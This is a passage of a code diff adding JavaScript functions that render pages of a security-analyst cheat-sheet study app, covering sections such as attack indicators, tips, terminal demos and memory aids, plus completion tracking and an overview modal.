+            🔎 3. KEY ANOMALIES &amp; ATTACK INDICATORS TO LOOK FOR
+          </h3>
+          <div style="background:rgba(239,68,68,0.06); border-left:4px solid var(--accent-red); padding:0.9rem; border-radius:0 10px 10px 0; color:var(--text-ink); font-weight:600;">
+            ${escapeHTML(page.lookFor)}
+          </div>
+        </div>
+
+        <!-- 4. PRO ANALYST TIP & INTERVIEW EDGE -->
+        <div class="section-block">
+          <h3 class="section-heading" style="color:var(--accent-blue); font-size:1rem; font-weight:800; margin-bottom:0.4rem;">
+            💡 4. PRO ANALYST TIP / INTERVIEW EDGE
+          </h3>
+          <div style="background:rgba(56,189,248,0.08); border-left:4px solid var(--accent-blue); padding:0.9rem; border-radius:0 10px 10px 0; color:var(--text-ink);">
+            ${escapeHTML(page.proTip)}
+          </div>
+        </div>
+
+        <!-- 5. REAL TERMINAL OUTPUT DEMO -->
+        <div class="section-block">
+          <h3 class="section-heading" style="color:var(--accent-blue); font-size:1rem; font-weight:800; margin-bottom:0.4rem;">
+            💻 5. REAL TERMINAL LOG OUTPUT DEMONSTRATION
+          </h3>
+          <div class="cmd-box" style="background:#0f172a; color:#f8fafc; padding:0.9rem; border-radius:10px; font-family:'Fira Code',monospace; font-size:0.84rem; overflow-x:auto;">
+            <pre style="margin:0; white-space:pre-wrap; word-break:break-all;">${escapeHTML(page.example)}</pre>
+          </div>
+        </div>
+
+        <!-- 6. CAUTION & IMPACT -->
+        <div class="section-block">
+          <h3 class="section-heading" style="color:var(--accent-blue); font-size:1rem; font-weight:800; margin-bottom:0.4rem;">
+            ⚠️ 6. OPERATIONAL CAUTION &amp; SYSTEM IMPACT
+          </h3>
+          <p style="font-size:0.88rem; color:var(--text-dark); background:var(--paper-bg); padding:0.75rem; border-radius:8px; border:1px solid var(--card-border);">
+            ${escapeHTML(page.caution)}
+          </p>
+        </div>
+
+        <!-- 7. FAST REVISION MEMORY TRICK -->
+        <div class="section-block">
+          <h3 class="section-heading" style="color:var(--accent-blue); font-size:1rem; font-weight:800; margin-bottom:0.4rem;">
+            📌 7. FAST REVISION MEMORY ANCHOR
+          </h3>
+          <div style="background:rgba(34,197,94,0.12); border:1.5px solid #22c55e; border-radius:10px; padding:0.9rem; font-weight:800; color:#15803d; font-size:0.95rem;">
+            🧠 ${escapeHTML(page.memoryTrick || page.cmd)}
+          </div>
+        </div>
+      </div>
+
+      <div class="page-footer" style="margin-top:2rem; padding-top:1rem; border-top:2px dashed var(--card-border); display:flex; justify-content:space-between; align-items:center;">
+        <span style="font-weight:700; color:#64748b;">Page ${page.id} of 350</span>
+        <button class="btn-complete ${isCompleted ? 'completed' : ''}" onclick="toggleCheatPageCompletion(${page.id})">
+          ${isCompleted ? '✓ Completed' : 'Mark as Completed'}
+        </button>
+      </div>
+    </article>
+  `;
+}
+
+function toggleCheatPageCompletion(id) {
+  const idx = completedCheatPages.indexOf(id);
+  if (idx > -1) completedCheatPages.splice(idx, 1);
+  else completedCheatPages.push(id);
+  localStorage.setItem("cheatsheet_completed_pages", JSON.stringify(completedCheatPages));
+  renderCurrentView();
+}
+
+function openMasterCheatOverview() {
+  const modal = document.createElement("div");
+  modal.id = "master-cheat-modal";
+  modal.style.cssText = "position:fixed; inset:0; z-index:99999; background:rgba(0,0,0,0.85); backdrop-filter:blur(8px); display:flex; justify-content:center; align-items:center; padding:1.5rem;";
+  modal.innerHTML = `
+    <div style="background:var(--paper-bg); width:95%; max-width:1200px; max-height:90vh; overflow-y:auto; border-radius:18px; border:2px solid var(--accent-blue); padding:1.5rem; position:relative;">
+      <button onclick="document.getElementById('master-cheat-modal').remove()" style="position:absolute; top:1rem; right:1rem; background:var(--accent-red); color:#fff; border:none; border-radius:8px; padding:0.4rem 0.8rem; font-weight:700; cursor:pointer;">✕ Close</button>
+      ${generateCheatSheetHTML()}
+    </div>
+  `;
+  document.body.appendChild(modal);
+}
+
